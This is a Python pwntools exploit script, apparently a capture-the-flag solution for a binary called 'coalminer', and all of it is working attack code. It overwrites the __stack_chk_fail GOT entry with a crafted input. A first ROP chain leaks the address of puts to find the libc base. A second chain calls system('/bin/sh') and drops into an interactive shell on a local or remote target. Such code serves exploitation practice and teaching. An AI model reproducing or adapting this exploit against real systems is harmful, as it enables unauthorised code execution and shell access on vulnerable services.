#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './coalminer'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400bf3 # pop rdi ; ret
p4r  = 0x0000000000400bec  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
ret  = 0x00000000004006ae # ret

# elf, libc

# rop1
sla('> ','add')
sla('Enter a name: \n','TaQini__'+p64(elf. got['__stack_chk_fail']))
ropchain = p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x400770)
sla('Enter a description: ',p64(p4r)+ropchain)
ru('\n')
# debug()
puts = uu64(rc(6))
info_addr('puts',puts)
libcbase = puts - libc.sym['puts']
info_addr('libcbase',libcbase)
system = libcbase + libc.sym['system']
binsh  = libcbase + libc.search("/bin/sh").next()
info_addr('system',system)
info_addr('binsh',binsh)

# rop2
sla('> ','add')
sla('Enter a name: \n','TaQini__'+p64(elf. got['__stack_chk_fail']))
ropchain = p64(ret) + p64(prdi) + p64(binsh) + p64(system) + p64(0x400770)
debug()
sla('Enter a description: \n',p64(p4r)+ropchain)

# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

